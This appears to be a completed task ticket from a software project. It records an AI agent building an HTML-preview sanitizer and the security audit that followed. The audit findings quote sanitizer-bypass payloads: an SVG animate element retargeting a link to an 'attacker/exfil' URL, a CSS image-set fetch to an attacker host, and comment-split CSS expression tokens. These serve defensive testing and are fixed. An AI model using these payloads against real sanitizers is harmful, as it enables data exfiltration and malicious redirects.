# STATUS

- ID: `T-Bk4Hs7-preview-backend`
- Updated At: `2026-07-30`
- State: `Done`
- Owner: `claude` (backend agent)

## This update
- By: architect · Role: architect · Date: 2026-07-30 · Comment: Task ticket scaffolded while the
  backend agent implements. Scope: CONTRACT 1A.1 (classification: `kind`/`mime`/`data_uri`,
  magic-byte confirmation, SVG-as-markup) + 1A.2 (`ui/htmlpreview.py` sanitizer/inliner and the
  `GET /api/files/html` route) + the 1A.4 test groups that pin them. CONTRACT 1A.3
  (Origin/Host/CSRF middleware) is deliberately **not** here — it is `T-Sh6Rz3-origin-host-csrf`.
  Authoritative design: `docs-md/dashboard-file-preview-hld.md` §4.1–§4.2; rationale: ADR-0011
  D1/D2.
- By: architect · Role: architect · Date: 2026-07-30 · Comment: Task **Done**. Implementation
  landed, reviewed, adversarially audited, fixed, and re-verified. This task owns five of the six
  audit findings (H1, M1, L1, L2, L3 — all in `htmlpreview.py`); L4 belongs to `T-Sh6Rz3`. Full
  catalogue with evidence: HLD §10. The single most important outcome is recorded below under
  "Audit findings owned by this task": the sanitizer shipped as a **blocklist plus special cases**
  rather than the keep-only allowlist AC-8 and HLD §4.2 specified, and H1/M1 are the direct
  consequence of that inversion.

## Evidence
- **Gates (post-fix, post-audit):**
  - `uv run pytest -q` → **1793 passed, 7 skipped** (pre-epic baseline **1651 passed, 7 skipped**).
  - `uv run ruff check .` → clean.
  - `uv run ruff format --check .` → clean except `tests/test_e2e_builtin_routed_runner.py`,
    confirmed failing **identically at HEAD** and untouched by this task.
  - `uv run mypy src` → clean except the 4 pre-existing `_version.py` errors, confirmed failing
    identically at HEAD.
- Code shipped: `src/agent_orchestrator/ui/files.py` (classification), new
  `src/agent_orchestrator/ui/htmlpreview.py` (735 lines — parser, allowlist serializer, URL
  pipeline, CSS/`@import`, budgets), `src/agent_orchestrator/ui/service.py` (pass-through),
  `src/agent_orchestrator/ui/app.py` (route only — middleware left to `T-Sh6Rz3`, no lost change
  despite concurrent edits).
- Tests shipped: `tests/ui/test_htmlpreview.py` (new), `tests/ui/test_files.py` and
  `tests/ui/test_api_integration.py` (extended), including the AC-13 escaping test in **both** a
  text node and an attribute value, and traversal on **both** endpoints (AC-30).
- Contract fidelity: `kind`/`mime`/`data_uri` are additive on `FileContent`; the seven
  `DroppedRef.reason` values match `ui/src/types.ts` exactly — **no contract drift reported to or
  discovered by `T-Fv9Ld2`**.

## Audit findings owned by this task (all fixed and re-verified)

**The structural finding, which explains the other two:** the element/attribute policy shipped as
a **blocklist plus special cases** (`DROPPED_ELEMENTS_WITH_SUBTREE`, `HARD_DROP_ATTRS`, `on*`,
plus URL-attribute processing; everything else passes through escaped) rather than the keep-only
allowlist AC-8/HLD §4.2 called for. It is a defensible reading of the contract's "drop these"
rule lists, but it **inverts the safety property**: an allowlist fails toward a missing tag, a
blocklist fails toward a live one. Both findings below are simply things that were *not on a
list*.

- **H1 (High).** `<svg><a><text>x</text><animate attributeName="href"
  values="http://attacker/exfil"/></a></svg>`. SVG SMIL animation retargets **any** attribute to
  an attacker-chosen value **at render time**, after sanitization is over — so `<a href>`
  stripping was defeated even though the emitted markup contained no live URL. Confirmed in real
  headless Chrome: a genuine synthetic click made the sandboxed iframe **self-navigate** to the
  attacker URL, **request captured on a listener**. Contained to the iframe (top frame verified
  unmoved) so **not** a sandbox escape or origin compromise — but a real one-click egress and
  malicious-redirect channel, and a genuine breach of the epic's **I2 "no egress channel"**
  invariant. **Fixed** by adding `animate`, `set`, `animateTransform`, `animateMotion`, `discard`
  to `DROPPED_ELEMENTS_WITH_SUBTREE`; no functionality cost, since live attribute retargeting has
  no legitimate use in a static preview. **Re-verified:** payload re-fired post-fix — elements
  gone, **zero** attacker-host occurrences.
- **M1 (Medium).** CSS `image-set("http://attacker/x.png" 1x)` takes **bare string** candidates
  with no `url(` token, so it bypassed the URL pipeline entirely (AC-25 covered `url()` only).
  Blocked in shipped form by the frame CSP's `img-src data:` — proven with positive **and**
  negative controls, not assumed — so never exploitable. Fixed anyway at Medium because nothing
  pinned the *sanitizer's own* correctness: the mitigation was purely a CSP side effect, so any
  later widening of `img-src` would have silently reopened a live egress channel with no test
  failing. **Fixed** — `image-set()`/`-webkit-image-set()` candidates now route through the same
  pipeline, with the closing paren found by a paren-counting scan rather than regex (candidates
  nest: `image-set(url(a.png) 1x, …)`).
- **L1 (Low).** CSS comments defeated the dangerous-token strip
  (`width:exp/**/ression(alert(1))`, `-moz/**/-binding:url(…)`) because the token regex ran
  *before* comment removal. Ordering fixed. The constructs are **dead in all current browsers**,
  so this was hygiene, not a live hole — fixed because ordering bugs of this shape generalize.
- **L2 (Low).** `srcset` splitting mangled `data:` URI candidates (commas inside base64 treated as
  separators). **Correctness, not security** — it broke legitimate images rather than admitting
  illegitimate ones. Fixed.
- **L3 (Low).** Rebound `xlink:href` namespace prefixes. Reasoned **unreachable** via HTML
  foreign-content parsing rules, closed anyway rather than resting on a parser-behaviour argument.

**Attacked and found sound** (evidence *for* the design, not absence of testing): `<scr<script>ipt>`
and nested-tag reassembly fail against `html.parser` for the same tokenizer reason they fail
against real browsers — the concrete payoff of AC-8's parse-don't-regex rule; CDATA-in-SVG
smuggling dropped wholesale; **percent-decode-once** resisted double-encoded traversal (the exact
hazard flagged in this ticket's Risks); `data:image/svg+xml` correctly excluded from the inline
MIME allowlist; and eight malformed/truncated documents neither raised nor hung. HLD §10.4.

## Judgment calls flagged
1. **Blocklist instead of keep-only allowlist** — the significant one, above. Documented at the
   module docstring as a deliberate reading of the contract's rule lists. Recorded as the epic's
   highest-value follow-up (HLD §9.2) rather than reworked post-audit, because layers 1 and 3
   demonstrably contain layer-2 misses. That makes it survivable, **not** correct.
2. **CSS is processed with regex, not a parser** — no stdlib CSS parser exists and adding a
   dependency was out of scope. Defensible because CSS has no "tag soup" ambiguity comparable to
   HTML's, but it is the reason L1 (comment-ordering) and M1 (`image-set`) were both possible, so
   it is the weakest part of the pipeline by construction.
3. **`data:image/svg+xml` excluded from `HTML_DATA_URI_MIME_ALLOWLIST`** — deliberate: navigating
   directly to such a URI executes its script. Loses the rare legitimate inline SVG data URI; the
   right trade given SVG-is-markup everywhere else in this pipeline.
4. **`<a href>` rationale corrected in code, not just docs.** The call-site comment now states
   that stripping is a **real security control** (sandboxed frames self-navigate; no CSP directive
   stops navigation), not the "sandbox blocks navigation anyway / dead UI" reasoning this ticket
   was originally written against. That false premise is what let H1 go unnoticed.

## Risks / Blockers
- None; task closed. Original risks and their outcome:
  - `ui/app.py` concurrent edits with `T-Sh6Rz3` — no lost change.
  - Contract drift to `T-Fv9Ld2` — none; field names and reason values matched at integration.
  - **Percent-decode once** — held; audit confirmed double-encoded traversal resisted.
  - Resolve against the HTML file's own directory — held.
  - `@import` visited-set — held; cycles terminate.
- Carried forward: the blocklist-vs-allowlist follow-up (judgment call 1) and the CSS-by-regex
  weakness (judgment call 2), both recorded at epic level.

## Next actions
- None for this task. Epic-level follow-up owned here if picked up: convert
  `htmlpreview.py`'s element/attribute policy to a true keep-only allowlist, and consider
  splitting the CSS sub-concern out of the 735-line module (reviewer's non-blocking suggestion).
